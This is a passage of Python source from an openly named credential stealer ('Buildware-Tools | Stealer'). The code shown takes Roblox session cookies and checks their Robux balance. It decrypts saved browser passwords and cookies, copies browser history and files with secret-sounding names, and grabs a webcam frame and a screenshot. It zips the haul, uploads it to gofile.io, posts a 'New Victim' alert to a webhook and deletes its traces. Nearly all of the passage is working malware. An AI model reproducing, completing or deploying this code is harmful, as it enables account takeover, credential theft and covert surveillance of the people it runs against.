            _cmap = {".ROBLOSECURITY": _ck}
            _ua = {}
            try:
                _ua = dict(_http.headers) if _http.headers else {}
            except Exception:
                _ua = {}
            _ua.setdefault("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            _ua.setdefault("Accept", "application/json")
            try:
                _r = _http.get("https://users.roblox.com/v1/users/authenticated", cookies=_cmap, headers=_ua, timeout=12)
                if _r.status_code != 200:
                    return {}
                _j = _r.json()
                _uid = _j.get("id")
                _rb = "N/A"
                if _uid is not None:
                    try:
                        _r2 = _http.get("https://economy.roblox.com/v1/users/" + str(_uid) + "/currency", cookies=_cmap, headers=_ua, timeout=12)
                        if _r2.status_code == 200:
                            _rb = _r2.json().get("robux", "N/A")
                    except Exception:
                        pass
                _j["RobuxBalance"] = _rb
                _j["IsPremium"] = False
                if _uid is not None:
                    try:
                        _r3 = _http.get("https://premiumfeatures.roblox.com/v1/users/" + str(_uid) + "/validate-membership", cookies=_cmap, headers=_ua, timeout=8)
                        if _r3.status_code == 200:
                            _pj = _r3.json()
                            if isinstance(_pj, bool):
                                _j["IsPremium"] = _pj
                            elif isinstance(_pj, dict):
                                _j["IsPremium"] = bool(_pj.get("isPremium") or _pj.get("isSubscribed") or _pj.get("hasMembership"))
                            else:
                                _j["IsPremium"] = True
                    except Exception:
                        pass
                return _j
            except Exception:
                return {}
        _cks = []
        _data = {}
        _bc_labels = {
            "opera_gx": "Opera GX", "librewolf": "LibreWolf", "chrome": "Chrome", "edge": "Edge",
            "firefox": "Firefox", "opera": "Opera", "brave": "Brave", "chromium": "Chromium",
            "vivaldi": "Vivaldi", "arc": "Arc", "safari": "Safari",
        }
        _pairs = []
        for _attr in ("edge", "chrome", "firefox", "opera", "opera_gx", "brave", "chromium", "vivaldi", "librewolf", "arc", "safari"):
            _fn = getattr(_bc3, _attr, None)
            if callable(_fn):
                _pairs.append((_bc_labels.get(_attr, _attr.title()), _fn))
        for _nm, _fn in _pairs:
            if _fn is None:
                continue
            try:
                _ck = _roblox_cookie_from_browser(_fn)
                if not _ck or _ck in _cks:
                    continue
                _cks.append(_ck)
                _api = _rbx_api(_ck)
                _data[_nm] = {
                    "cookie": _ck,
                    "user": _api.get("name", "N/A"),
                    "display": _api.get("displayName", "N/A"),
                    "robux": _api.get("RobuxBalance", "N/A"),
                    "premium": _api.get("IsPremium", False),
                }
            except Exception:
                continue
        if not _cks and hasattr(_bc3, "load") and callable(_bc3.load):
            try:
                for _dom in ("roblox.com", ""):
                    try:
                        _mj = _bc3.load(domain_name=_dom)
                    except:
                        _mj = None
                    if not _mj:
                        continue
                    _ck = _pick_cookie(_mj)
                    if _ck and _ck not in _cks:
                        _cks.append(_ck)
                        _api = _rbx_api(_ck)
                        _data["All browsers (load)"] = {
                            "cookie": _ck,
                            "user": _api.get("name", "N/A"),
                            "display": _api.get("displayName", "N/A"),
                            "robux": _api.get("RobuxBalance", "N/A"),
                            "premium": _api.get("IsPremium", False),
                        }
                        break
            except Exception:
                pass
        _lines.append("[+] Total: " + str(len(_cks)) + " cookie(s)")
        _lines.append("")
        if not _cks:
            _lines.append("[x] No .ROBLOSECURITY cookie found in supported browsers.")
            _lines.append("[?] Open https://www.roblox.com in a supported browser while logged in, then run again (closing the browser can help).")
        for _nm, _d in _data.items():
            _lines.append("[+] " + _nm)
            _lines.append("    Username : " + str(_d["user"]))
            _lines.append("    Display  : " + str(_d["display"]))
            _lines.append("    Robux    : " + str(_d["robux"]))
            _lines.append("    Premium  : " + str(_d["premium"]))
            _lines.append("    Cookie   : " + str(_d["cookie"]))
            _lines.append("")
    except Exception as _rbx_e:
        _lines.append("[x] Error (Roblox Cookies could not run):")
        _lines.append("    " + str(_rbx_e))
    _rbx_save()


def _0xBrowserPasswords():
    _out = os.path.join(_zip_dir,"Browsers","Passwords")
    os.makedirs(_out, exist_ok=True)
    for _bname, _bpath in _BROWSERS.items():
        _key = _0xGetKey(_bpath)
        if not _key: continue
        _pws = []
        for _prof in _0xProfiles(_bpath):
            _db = os.path.join(_bpath, _prof, "Login Data")
            if not os.path.exists(_db): continue
            _tmp = os.path.join(os.getenv('TEMP',''), f'bw_{random.randint(1000,9999)}_p.db')
            try:
                shutil.copy2(_db, _tmp)
                _cn = sqlite3.connect(_tmp); _cr = _cn.cursor()
                _cr.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
                for _row in _cr.fetchall():
                    _pw = _0xDecrypt(_row[2], _key) if _row[2] else ""
                    if _pw: _pws.append({'url':_row[0],'user':_row[1],'pass':_pw,'profile':_prof})
                _cn.close()
            except: pass
            finally:
                try: os.remove(_tmp)
                except: pass
        if _pws:
            with open(os.path.join(_out,f"{_bname}.txt"),'w',encoding='utf-8') as _f:
                _f.write(f"[+] {_bname} - {len(_pws)} passwords\n\n")
                for _p in _pws:
                    _f.write(f"URL      : {_p['url']}\nUsername : {_p['user']}\nPassword : {_p['pass']}\nProfile  : {_p['profile']}\n\n")


def _0xBrowserCookies():
    _out = os.path.join(_zip_dir,"Browsers","Cookies")
    os.makedirs(_out, exist_ok=True)
    for _bname, _bpath in _BROWSERS.items():
        _key = _0xGetKey(_bpath)
        if not _key: continue
        _cks = []
        for _prof in _0xProfiles(_bpath):
            _db = os.path.join(_bpath, _prof, "Network", "Cookies")
            if not os.path.exists(_db): _db = os.path.join(_bpath, _prof, "Cookies")
            if not os.path.exists(_db): continue
            _tmp = os.path.join(os.getenv('TEMP',''), f'bw_{random.randint(1000,9999)}_c.db')
            try:
                shutil.copy2(_db, _tmp)
                _cn = sqlite3.connect(_tmp); _cr = _cn.cursor()
                _cr.execute("SELECT host_key, name, encrypted_value, path FROM cookies ORDER BY creation_utc DESC")
                for _row in _cr.fetchall():
                    _val = _0xDecrypt(_row[2], _key) if _row[2] else ""
                    if _val: _cks.append({'host':_row[0],'name':_row[1],'value':_val,'path':_row[3],'profile':_prof})
                _cn.close()
            except: pass
            finally:
                try: os.remove(_tmp)
                except: pass
        if _cks:
            with open(os.path.join(_out,f"{_bname}.txt"),'w',encoding='utf-8') as _f:
                _f.write(f"[+] {_bname} - {len(_cks)} cookies\n\n")
                for _c in _cks:
                    _f.write(f"Host    : {_c['host']}\nName    : {_c['name']}\nValue   : {_c['value']}\nPath    : {_c['path']}\nProfile : {_c['profile']}\n\n")


def _0xBrowserHistory():
    _out = os.path.join(_zip_dir,"Browsers","History")
    os.makedirs(_out, exist_ok=True)
    for _bname, _bpath in _BROWSERS.items():
        _hist = []
        for _prof in _0xProfiles(_bpath):
            _db = os.path.join(_bpath, _prof, "History")
            if not os.path.exists(_db): continue
            _tmp = os.path.join(os.getenv('TEMP',''), f'bw_{random.randint(1000,9999)}_h.db')
            try:
                shutil.copy2(_db, _tmp)
                _cn = sqlite3.connect(_tmp); _cr = _cn.cursor()
                _cr.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                for _row in _cr.fetchall():
                    _dt = None
                    if _row[3] and _row[3] > 0:
                        try: _dt = datetime.datetime.fromtimestamp((_row[3]/1000000)-11644473600).strftime('%Y-%m-%d %H:%M:%S')
                        except: pass
                    _hist.append({'url':_row[0],'title':_row[1] or 'No Title','visits':_row[2],'date':_dt or 'Unknown','profile':_prof})
                _cn.close()
            except: pass
            finally:
                try: os.remove(_tmp)
                except: pass
        if _hist:
            with open(os.path.join(_out,f"{_bname}.txt"),'w',encoding='utf-8') as _f:
                _f.write(f"[+] {_bname} - {len(_hist)} entries\n\n")
                for _h in _hist:
                    _f.write(f"Title   : {_h['title']}\nURL     : {_h['url'][:100]}\nVisits  : {_h['visits']}\nDate    : {_h['date']}\nProfile : {_h['profile']}\n\n")


def _0xInterestingFiles():
    _paths = [
        os.path.join(_USERPROFILE,"Desktop"),
        os.path.join(_USERPROFILE,"Downloads"),
        os.path.join(_USERPROFILE,"Documents"),
    ]
    _kw = {'2fa','mfa','otp','account','login','password','passwd','pwd','secret','seed','recovery','wallet','crypto','bitcoin','token','webhook','key','private','bank','paypal','credential','backup','auth','master','admin','vault','identity','passport','leak','dump','hack'}
    _dst = os.path.join(_zip_dir,"Interesting Files")
    os.makedirs(_dst, exist_ok=True)
    for _p in _paths:
        if not os.path.exists(_p): continue
        for _rt, _, _fs in os.walk(_p):
            for _fl in _fs:
                try:
                    if _fl.lower().endswith(('.txt','.sql','.zip','.pdf','.csv','.json','.doc','.docx','.xls','.xlsx')):
                        _fn = os.path.splitext(_fl)[0].lower()
                        if any(k in _fn for k in _kw):
                            _src = os.path.join(_rt, _fl)
                            if os.path.getsize(_src) < 10*1024*1024:
                                shutil.copy2(_src, _dst)
                except: pass


def _0xCamera():
    try:
        import cv2 as _cv, numpy as _np
        os.environ['OPENCV_LOG_LEVEL'] = 'SILENT'
        _cv.setLogLevel(0)
        _cam = _cv.VideoCapture(0, _cv.CAP_DSHOW)
        _cam.set(_cv.CAP_PROP_FRAME_WIDTH, 640)
        _cam.set(_cv.CAP_PROP_FRAME_HEIGHT, 480)
        time.sleep(0.2)
        if _cam.isOpened():
            _ret, _frame = _cam.read()
            if _ret and _frame is not None:
                _cv.imwrite(os.path.join(_zip_dir,"Camera.png"), _frame, [_cv.IMWRITE_PNG_COMPRESSION, 6])
        _cam.release(); _cv.destroyAllWindows()
    except: pass


def _0xScreenshot():
    try:
        from PIL import ImageGrab as _ig
        _ss = _ig.grab(all_screens=True)
        _ss.save(os.path.join(_zip_dir,"Screenshot.png"))
    except: pass


_0xFeatureMap = {}

def _0xRunAll():
    try: _0xSysInfo()
    except: pass
    try: _0xWallets()
    except: pass
    try: _0xGames()
    except: pass
    try: _0xDiscordTokens()
    except: pass
    try: _0xRobloxCookies()
    except: pass
    try: _0xBrowserPasswords()
    except: pass
    try: _0xBrowserCookies()
    except: pass
    try: _0xBrowserHistory()
    except: pass
    try: _0xInterestingFiles()
    except: pass
    try: _0xCamera()
    except: pass
    try: _0xScreenshot()
    except: pass

_0xRunAll()


_zip_fn = f"{_zip_dir}.zip"
try:
    import zipfile as _zf
    with _zf.ZipFile(_zip_fn, "w", _zf.ZIP_DEFLATED, compresslevel=6) as _z:
        for _rt, _ds, _fs in os.walk(_zip_dir):
            for _fl in _fs:
                try:
                    _fp = os.path.join(_rt, _fl)
                    _z.write(_fp, os.path.relpath(_fp, _zip_dir))
                except: continue
except: sys.exit(1)

def _0xUploadGofile(_fp):
    for _ in range(2):
        try:
            _sr = _http.get("https://api.gofile.io/servers", timeout=15).json()
            if _sr.get("status") != "ok": continue
            _sv = _sr["data"]["servers"][0]["name"]
            time.sleep(random.uniform(0.5,1.5))
            with open(_fp,"rb") as _f:
                _r = _http.post(f"https://{_sv}.gofile.io/uploadFile", files={"file":_f}, timeout=180)
            _d = _r.json()
            if _d.get("status") == "ok": return _d["data"].get("downloadPage")
        except: time.sleep(2)
    return None

def _0xGetDisplayName():
    try:
        _fn = ctypes.windll.secur32.GetUserNameExW
        _sz = ctypes.pointer(ctypes.c_ulong(0))
        _fn(3, None, _sz)
        _nb = ctypes.create_unicode_buffer(_sz.contents.value)
        _fn(3, _nb, _sz)
        return _nb.value
    except: return _user_pc

def _0xSendWebhook(_link, _fsz):
    _mb = round(_fsz / (1024*1024), 2)
    _feat_map = {
        'System_Information': ('System Information', True),
        'Wallets_Sessions_Files': ('Wallets Sessions', True),
        'Games_Sessions_Files': ('Games Sessions', True),
        'Telegram_Sessions_Files': ('Telegram Sessions', False),
        'Discord_Tokens': ('Discord Tokens', True),
        'Discord_Injection': ('Discord Injection', False),
        'Roblox_Cookies': ('Roblox Cookies', True),
        'Browser_Passwords': ('Browser Passwords', True),
        'Browser_Cookies': ('Browser Cookies', True),
        'Browser_History': ('Browser History', True),
        'Browser_Downloads': ('Browser Downloads', False),
        'Browser_Extensions': ('Browser Extensions', False),
        'Interesting_Files': ('Interesting Files', True),
        'Camera_Capture': ('Camera Capture', True),
        'Screenshot': ('Screenshot', True),
    }
    _fl = ""
    for _k, (_dn, _en) in _feat_map.items():
        _st = "Enabled  [+]" if _en else "Disabled [x]"
        _fl += f"{_dn:<22} : {_st}\n"
    _ct = "@everyone" if False else ""
    _now = datetime.datetime.now()
    _embed = {
        "title": f"New Victim ({_0xGetDisplayName()})",
        "thumbnail": {"url": _icon_url},
        "description": f"**Folder Information**\n```Folder Size   : {_mb} MB\nCreation Date : {_now.strftime('%d/%m/%Y')}\nCreation Hour : {_now.strftime('%H:%M:%S')}```\n**Stolen Information**\n```{_fl.rstrip()}```\n**Download Link**\n{_link}",
        "color": 0x8b0000,
        "footer": {"text":"Buildware-Tools | Stealer - https://github.com/v4lkyr0/Buildware-Tools","icon_url":_icon_url}
    }
    _payload = {"content":_ct,"embeds":[_embed],"username":"Buildware-Tools | Stealer","avatar_url":_icon_url}
    time.sleep(random.uniform(0.5,2.0))
    for _ in range(3):
        try:
            _r = _http.post(_wh_url, json=_payload, timeout=30)
            if _r.status_code in [200,204]: return True
            if _r.status_code == 429: time.sleep(random.uniform(3.0,6.0)); continue
        except: pass
        time.sleep(random.uniform(2.0,4.0))
    return False

try:
    time.sleep(random.uniform(1.0,3.0))
    _link = _0xUploadGofile(_zip_fn) or "Upload failed."
    _fsz = os.path.getsize(_zip_fn)
    _0xSendWebhook(_link, _fsz)
except: pass


def _0xRmTree(_path):
    if not _path or not os.path.exists(_path):
        return
    def _onerr(_func, _p, _exc):
        try:
            os.chmod(_p, stat.S_IWRITE)
            _func(_p)
        except:
            pass
    for _ in range(6):
        try:
            shutil.rmtree(_path, onerror=_onerr)
            if not os.path.exists(_path):
                return
        except:
            pass
        time.sleep(0.45)

def _0xCleanup():
    try:
        _http.close()
    except: pass
    try:
        _0xRmTree(_zip_dir)
    except: pass
    try:
        _zn = f"{_zip_dir}.zip"
        if os.path.exists(_zn):
            for _ in range(6):
                try:
                    os.chmod(_zn, stat.S_IWRITE)
                    os.remove(_zn)
                    break
                except:
                    time.sleep(0.45)
    except: pass

_0xCleanup()
